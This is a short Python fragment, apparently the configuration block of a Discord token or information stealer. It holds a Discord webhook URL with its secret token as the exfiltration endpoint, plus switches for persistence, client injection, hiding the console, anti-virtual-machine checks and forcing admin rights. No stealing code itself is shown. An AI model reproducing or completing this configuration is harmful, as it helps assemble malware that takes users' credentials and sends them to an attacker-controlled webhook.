...
config = {
    ...
    'webhook': 'https://discord.com/api/webhooks/1337101897550794842/3s_IIsTTnNPyz3s2tDNLk7vF38o85brqFnwRa33DnnP8BDyYy4vPQwpB9aSGxQlP6q1X',
    'persist': False,
    'keep-alive': False,
    'injection_url': 'https://www.wikipedia.org/',
    'inject': False,
    'hideconsole': False,
    'antivm': True,
    'force_admin': False,
